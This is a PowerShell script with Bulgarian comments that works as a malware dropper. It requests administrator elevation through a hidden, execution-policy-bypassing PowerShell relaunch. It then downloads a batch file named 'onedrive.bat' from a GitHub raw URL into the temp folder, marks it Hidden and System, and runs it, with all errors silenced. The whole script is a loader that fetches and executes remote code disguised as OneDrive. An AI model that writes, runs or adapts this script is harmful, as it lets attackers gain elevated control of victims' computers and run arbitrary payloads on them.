if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $scriptContent = @'
    $ErrorActionPreference = "SilentlyContinue"
    $url = "https://raw.githubusercontent.com/bgprofil9-create/profejt/refs/heads/main/onedrive.bat"
    $file = "$env:TEMP\onedrive.bat"
    Invoke-WebRequest -Uri $url -OutFile $file -UseBasicParsing
    if (Test-Path $file) {
        # Скриване на файла (Hidden + System)
        $item = Get-Item $file -Force
        $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
        Start-Process $file
    }
'@
    
    $tempFile = [System.IO.Path]::GetTempFileName() + ".ps1"
    $scriptContent | Set-Content $tempFile -Encoding UTF8
    Start-Process PowerShell "-NoProfile -ExecutionPolicy Bypass -File `"$tempFile`"" -Verb RunAs -WindowStyle Hidden
    exit
}

# -----------------------------------------------------------------
# Частта, която се изпълнява вече с права на администратор
# -----------------------------------------------------------------

$ErrorActionPreference = "SilentlyContinue"

$url = "https://raw.githubusercontent.com/bgprofil9-create/profejt/refs/heads/main/onedrive.bat"
$file = "$env:TEMP\onedrive.bat"

# Изтриваме стара версия ако съществува
if (Test-Path $file) { 
    Remove-Item $file -Force -ErrorAction SilentlyContinue 
}

Start-Sleep -Milliseconds 800

Invoke-WebRequest -Uri $url -OutFile $file -UseBasicParsing

Start-Sleep -Milliseconds 1200

if (Test-Path $file) {
    # Скриване на файла (Hidden + System атрибути)
    $item = Get-Item $file -Force
    $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
    
    Start-Process $file
    Write-Host " " -ForegroundColor Green
} else {
    Write-Host " " -ForegroundColor Red
}
